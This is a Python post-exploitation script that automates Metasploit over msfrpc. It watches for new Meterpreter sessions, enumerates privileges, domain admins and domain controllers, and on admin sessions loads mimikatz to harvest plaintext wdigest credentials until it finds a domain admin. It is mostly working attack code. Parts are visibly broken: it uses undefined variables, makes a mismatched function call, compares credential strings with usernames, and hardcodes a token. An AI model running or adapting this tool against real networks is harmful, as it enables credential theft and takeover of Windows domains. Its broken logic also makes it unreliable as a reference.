#!/usr/bin/env python3

import re
import os
import sys
import time
import signal
import msfrpc
import asyncio
import argparse
import netifaces
from IPython import embed
from termcolor import colored
from netaddr import IPNetwork, AddrFormatError
from subprocess import Popen, PIPE, CalledProcessError

NEW_SESS_DATA = {}
DOMAIN_DATA = {'domain':None, 'domain_admins':[], 'domain_controllers':[], 'high_priority_ips':[], 'creds':[]}

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-p", "--password", default='123', help="Password for msfrpc")
    parser.add_argument("-u", "--username", default='msf', help="Username for msfrpc")
    return parser.parse_args()

# Colored terminal output
def print_bad(msg, sess_num):
    if sess_num:
        print(colored('[-] ', 'red') + 'Session {} '.format(str(sess_num)).ljust(12)+'- '+msg)
    else:
        print(colored('[-] ', 'red') + msg)

def print_info(msg, sess_num):
    if sess_num:
        print(colored('[*] ', 'blue') + 'Session {} '.format(str(sess_num)).ljust(12)+'- '+msg)
    else:
        print(colored('[*] ', 'blue') + msg)

def print_good(msg, sess_num):
    if sess_num:
        print(colored('[+] ', 'green') + 'Session {} '.format(str(sess_num)).ljust(12)+'- '+msg)
    else:
        print(colored('[+] ', 'green') + msg)

def print_great(msg, sess_num):
    if sess_num:
        print(colored('[*] ', 'yellow', attrs=['bold']) + 'Session {} '.format(str(sess_num)).ljust(12)+'- '+msg)
    else:
        print(colored('[!] ', 'yellow') + msg)

def kill_tasks():
    print()
    print_info('Killing tasks then exiting...', None)
    embed()
    for task in asyncio.Task.all_tasks():
        task.cancel()

def get_iface():
    '''
    Gets the right interface for Responder
    '''
    try:
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    except:
        ifaces = []
        for iface in netifaces.interfaces():
            # list of ipv4 addrinfo dicts
            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])

            for entry in ipv4s:
                addr = entry.get('addr')
                if not addr:
                    continue
                if not (iface.startswith('lo') or addr.startswith('127.')):
                    ifaces.append(iface)

        iface = ifaces[0]

    return iface

def get_local_ip(iface):
    '''
    Gets the the local IP of an interface
    '''
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip

async def get_shell_info(client, sess_num):
    sysinfo_cmd = 'sysinfo'
    sysinfo_end_str = [b'Meterpreter     : ']

    sysinfo_output, err = await run_session_cmd(client, sess_num, sysinfo_cmd, sysinfo_end_str)
    if err:
        print_bad('Session appears to be broken', sess_num)
        return [b'ERROR']

    else:
        sysinfo_split = sysinfo_output.splitlines()

    getuid_cmd = 'getuid'
    getuid_end_str = [b'Server username:']

    getuid_output, err = await run_session_cmd(client, sess_num, getuid_cmd, getuid_end_str)
    if err:
        print_bad('Session appears to be dead', sess_num)
        return [b'ERROR']
    else:
        getuid = b'User            : '+getuid_output.split(b'Server username: ')[-1].strip().strip()

    shell_info_list = [getuid] + sysinfo_split

    return shell_info_list

def get_domain(shell_info):
    for l in shell_info:

        if l == b'ERROR':
            return l

        l = l.decode('utf8')

        l_split = l.split(':')
        if 'Domain      ' in l_split[0]:
            if 'WORKGROUP' in l_split[1]:
                return b'no domain'
            else:
                domain = l_split[-1].strip()
                return domain.encode()

def is_domain_joined(user_info, domain):
    if user_info != b'ERROR':
        info_split = user_info.split(b':')
        dom_and_user = info_split[1].strip()
        dom_and_user_split = dom_and_user.split(b'\\')
        dom = dom_and_user_split[0]
        user = dom_and_user_split[1]

        if domain != b'no domain':
            if dom.lower() in domain.lower():
                return b'True'

    return b'False'

def print_shell_data(shell_info, admin_shell, local_admin, sess_num_str):
    print_info('New shell info', None)
    for l in shell_info:
        if l == b'ERROR':
            pass#####
        print('        '+l.decode('utf8'))
    msg =  '''        Admin shell     : {}
        Local admin     : {}
        Session number  : {}'''.format( 
                              admin_shell.decode('utf8'), 
                              local_admin.decode('utf8'),
                              sess_num_str)
    print(msg)

async def sess_first_check(client, sess_num):
    global NEW_SESS_DATA

    if b'first_check' not in NEW_SESS_DATA[sess_num]:
        sess_num_str = str(sess_num)
        NEW_SESS_DATA[sess_num][b'first_check'] = b'False'

        print_good('Gathering shell info...', sess_num)

        # Give meterpeter chance to open
        await asyncio.sleep(2)

        NEW_SESS_DATA[sess_num][b'session_number'] = sess_num_str.encode()
        NEW_SESS_DATA[sess_num][b'busy'] = b'False'

        shell_info = await get_shell_info(client, sess_num)
        if shell_info == [b'ERROR']:
            return

        domain = get_domain(shell_info)
        NEW_SESS_DATA[sess_num][b'domain'] = domain
        NEW_SESS_DATA[sess_num][b'domain_joined'] = is_domain_joined(shell_info[0], domain)

        admin_shell, local_admin = await check_privs(client, sess_num)

        print_shell_data(shell_info, admin_shell, local_admin, sess_num_str)

        # Update DOMAIN_DATA for domain admins and domain controllers
        await get_domain_data(client, sess_num)

async def check_privs(client, sess_num):
    global NEW_SESS_DATA

    cmd = 'run post/windows/gather/win_privs'
    end_str = [b'==================']

    output, err = await run_session_cmd(client, sess_num, cmd, end_str)
    if err:
        admin_shell = b'ERROR'
        local_admin = b'ERROR'

    else:
        split_out = output.splitlines()
        user_info_list = split_out[5].split()
        system = user_info_list[1]
        user = user_info_list[5]
        admin_shell = user_info_list[0]
        local_admin = user_info_list[2]

    NEW_SESS_DATA[sess_num][b'admin_shell'] = admin_shell
    NEW_SESS_DATA[sess_num][b'local_admin'] = local_admin

    return (admin_shell, local_admin)

async def get_domain_controllers(client, sess_num):
    global DOMAIN_DATA
    global NEW_SESS_DATA

    print_info('Getting domain controller...', sess_num)
    cmd = 'run post/windows/gather/enum_domains'
    end_str = [b'[+] Domain Controller:']

    output, err = await run_session_cmd(client, sess_num, cmd, end_str)
    # Catch timeout
    if err:
        return

    else:
        output = output.decode('utf8')
        if 'Domain Controller: ' in output:
            dc = output.split('Domain Controller: ')[-1].strip()
            if dc not in DOMAIN_DATA['domain_controllers']:
                DOMAIN_DATA['domain_controllers'].append(dc)
                print_good('Domain controller: '+dc, sess_num)

async def get_domain_admins(client, sess_num, ran_once):
    global DOMAIN_DATA
    global NEW_SESS_DATA

    print_info('Getting domain admins...', sess_num)
    cmd = 'run post/windows/gather/enum_domain_group_users GROUP="Domain Admins"'
    end_str = [b'[+] User list']

    output, err = await run_session_cmd(client, sess_num, cmd, end_str)
    if err:
        return

    output = output.decode('utf8')
    da_line_start = '[*] \t'

    if da_line_start in output:
        split_output = output.splitlines()

        domain_admins = []
        for l in split_output:
            if l.startswith(da_line_start):
                domain_admin = l.split(da_line_start)[-1].strip()
                domain_admins.append(domain_admin)

        for x in domain_admins:
            if x not in DOMAIN_DATA['domain_admins']:
                print_good('Domain admin: '+x, sess_num)
                DOMAIN_DATA['domain_admins'].append(x)

    # If we don't get any DAs from the shell we try one more time
    else:
        if ran_once:
            print_bad('No domain admins found', sess_num)
        else:
            print_bad('No domain admins found, trying one more time', sess_num)
            await get_domain_admins(client, sess_num, True)

async def get_domain_data(client, sess_num):
    ''' Callback for after we gather all the initial shell data '''
    global DOMAIN_DATA

    # Update domain data
    if b'domain' in NEW_SESS_DATA[sess_num]:
        DOMAIN_DATA['domain'] = NEW_SESS_DATA[sess_num][b'domain']

    # If no domain admin list found yet then find them
    if NEW_SESS_DATA[sess_num][b'domain_joined'] == b'True':
        if len(DOMAIN_DATA['domain_admins']) == 0:
            await get_domain_admins(client, sess_num, False)
        if len(DOMAIN_DATA['domain_controllers']) == 0:
            await get_domain_controllers(client, sess_num)

def update_session(session, sess_num):
    global NEW_SESS_DATA

    if sess_num in NEW_SESS_DATA:
        # Update session with the new key:value's in NEW_SESS_DATA
        # This will not change any of the MSF session data, just add new key:value pairs
        NEW_SESS_DATA[sess_num] = add_session_keys(session)

    else:
        NEW_SESS_DATA[sess_num] = session

        # Add empty error key to collect future errors
        if b'error' not in NEW_SESS_DATA[sess_num]:
            NEW_SESS_DATA[sess_num][b'error'] = []

async def run_mimikatz(client, sess_num):
    global DOMAIN_DATA

    load_mimi_cmd = 'load mimikatz'
    load_mimi_end_strs = [b'Success.', b'has already been loaded.']
    load_mimi_output, err = await run_session_cmd(client, sess_num, load_mimi_cmd, load_mimi_end_strs)
    if err:
        return
    wdigest_cmd = 'wdigest'
    wdigest_end_str = [b'    Password']
    mimikatz_output, err = await run_session_cmd(client, sess_num, wdigest_cmd, wdigest_end_str)
    if err:
        return 
    else:
        mimikatz_split = mimikatz_output.splitlines()
        for l in mimikatz_split:
            if l.startswith(b'0;'):
                line_split = l.split()
                dom = line_split[2]
                if dom.lower() == NEW_SESS_DATA[sess_num][b'domain'].lower():
                    user = '{}\{}'.format(dom.decode('utf8'), line_split[3].decode('utf8'))
                    password = line_split[4]
                    if b'wdigest KO' not in password:
                        user_and_pass = '{}:{}'.format(user, password.decode('utf8'))
                        if user_and_pass not in DOMAIN_DATA['creds']:
                            DOMAIN_DATA['creds'].append(user_and_pass)
                            print_good(msg, sess_num)
                            check_for_DA(user_and_pass)

def check_for_DA(user_and_pass):
    if user_and_pass in DOMAIN_DATA['domain_admins']:
        print_good('Domain admin found! {}'.format(user_and_pass))
        kill_tasks()
        sys.exit()

async def do_stuff_with_session(client, sess_num):
    ##################
    # YOUR CODE HERE #
    ##################

    await run_mimikatz(client, sess_num)

async def attack(client, sess_num):

    # Is admin
    if NEW_SESS_DATA[sess_num][b'admin_shell'] == b'True':
        await do_stuff_with_session(client, sess_num)

async def attack_with_session(client, session, sess_num):
    ''' Attacks with a session '''
    update_session(session, sess_num)

    # Get and print session info if first time we've checked the session
    task = await sess_first_check(client, sess_num)
    if task:
        await asyncio.wait(task)

    if is_session_broken(sess_num) == False:
        await attack(client, sess_num)

def get_output(client, cmd, sess_num):
    output = client.call('session.meterpreter_read', [str(sess_num)])

    # Everythings fine
    if b'data' in output:
        return (output[b'data'], None)

    # Got an error from the client.call
    elif b'error_message' in output:
        decoded_err = output[b'error_message'].decode('utf8')
        print_bad(error_msg.format(sess_num_str, decoded_err), sess_num)
        return (None, decoded_err)

    # Some other error catchall
    else:
        return (None, cmd)

def get_output_errors(output, counter, cmd, sess_num, timeout, sleep_secs):
    global NEW_SESS_DATA

    script_errors = [b'[-] post failed', 
                     b'error in script', 
                     b'operation failed', 
                     b'unknown command', 
                     b'operation timed out',
                     b'unknown session id']
    err = None

    # Got an error from output
    if any(x in output.lower() for x in script_errors):
        err = 'Command [{}] failed with error: {}'.format(cmd, output.decode('utf8').strip())

    # If no terminating string specified just wait til timeout
    if output == b'':
        counter += sleep_secs
        if counter > timeout:
            err = 'Command [{}] timed out'.format(cmd)

    # No output but we haven't reached timeout yet
    return (output, err, counter)

async def run_session_cmd(client, sess_num, cmd, end_strs, timeout=30):
    ''' Will only return a str if we failed to run a cmd'''
    global NEW_SESS_DATA

    err = None
    output = None
    error_msg = 'Error in session {}: {}'
    sess_num_str = str(sess_num)

    print_info('Running [{}]'.format(cmd), sess_num)

    while NEW_SESS_DATA[sess_num][b'busy'] == b'True':
        await asyncio.sleep(1)

    NEW_SESS_DATA[sess_num][b'busy'] = b'True'

    res = client.call('session.meterpreter_run_single', [str(sess_num), cmd])

    if b'error_message' in res:
        err_msg = res[b'error_message'].decode('utf8')
        print_bad(error_msg.format(sess_num_str, err_msg), sess_num)
        NEW_SESS_DATA[sess_num][b'error'].append(err_msg)
        return (None, err_msg)

    elif res[b'result'] == b'success':

        counter = 0
        sleep_secs = 0.5

        try:
            while True:
                await asyncio.sleep(sleep_secs)

                output, err = get_output(client, cmd, sess_num)

                # Error from meterpreter console
                if err:
                    NEW_SESS_DATA[sess_num][b'error'].append(err_msg)
                    print_bad('Meterpreter error: {}'.format(err), sess_num)
                    break

                # Check for errors from cmd's output
                output, err, counter = get_output_errors(output, counter, cmd, sess_num, timeout, sleep_secs)
                if err:
                    NEW_SESS_DATA[sess_num][b'error'].append(err)
                    print_bad(err, sess_num)
                    break

                # Successfully completed
                if end_strs:
                    if any(end_str in output for end_str in end_strs):
                        break
                    
                # If no end_str specified just return once we have any data
                else:
                    if len(output) > 0:
                        break

        # This usually occurs when the session suddenly dies or user quits it
        except Exception as e:
            err = 'exception below likely due to abrupt death of session'
            print_bad(error_msg.format(sess_num_str, err), sess_num)
            print_bad('    '+str(e), None)
            NEW_SESS_DATA[sess_num][b'error'].append(err)
            NEW_SESS_DATA[sess_num][b'busy'] = b'False'
            return (output, err)

    # b'result' not in res, b'error_message' not in res, just catch everything else as an error
    else:
        err = res[b'result'].decode('utf8')
        NEW_SESS_DATA[sess_num][b'error'].append(err)
        print_bad(res[b'result'].decode('utf8'), sess_num)

    NEW_SESS_DATA[sess_num][b'busy'] = b'False'

    return (output, err)
    
def get_perm_token(client):
    # Authenticate and grab a permanent token
    client.login(args.username, args.password)
    client.call('auth.token_add', ['123'])
    client.token = '123'
    return client

def is_session_broken(sess_num):
    ''' We remove 2 kinds of errored sessions: 1) timed out on sysinfo 2) shell died abruptly '''
    global NEW_SESS_DATA

    if b'error' in NEW_SESS_DATA[sess_num]:
        # Session timed out on initial sysinfo cmd
        if b'domain' not in NEW_SESS_DATA[sess_num]:
            return True
        elif b'domain' == b'ERROR':
            return True
        # Session abruptly died
        if NEW_SESS_DATA[sess_num][b'error'] == 'exception below likely due to abrupt death of session':
            return True
        # Session timed out
        if 'Rex::TimeoutError' in NEW_SESS_DATA[sess_num][b'error']:
            return True

    return False

def add_session_keys(session, sess_num):
    for k in NEW_SESS_DATA[sess_num]:
        if k not in session:
            session[k] = NEW_SESS_DATA[sess_num].get(k)

    return session

async def check_for_sessions(client, loop):
    global NEW_SESS_DATA

    print_info('Waiting on new meterpreter session', None)

    while True:
        # Get list of MSF sessions from RPC server
        sessions = client.call('session.list')

        for s in sessions:

            # Do stuff with session
            if s not in NEW_SESS_DATA:
                asyncio.ensure_future(attack_with_session(client, sessions[s], s))

        await asyncio.sleep(1)

def main(args):

    client = msfrpc.Msfrpc({})
    client = get_perm_token(client)

    loop = asyncio.get_event_loop()
    loop.add_signal_handler(signal.SIGINT, kill_tasks)
    task = check_for_sessions(client, loop)
    try:
        loop.run_until_complete(task)
    except asyncio.CancelledError:
        print_info('Tasks gracefully downed a cyanide pill before defecating themselves and collapsing in a twitchy pile', None)
    finally:
        loop.close()

if __name__ == "__main__":
    args = parse_args()
    if os.geteuid():
        print_bad('Run as root', None)
        sys.exit()
    main(args)

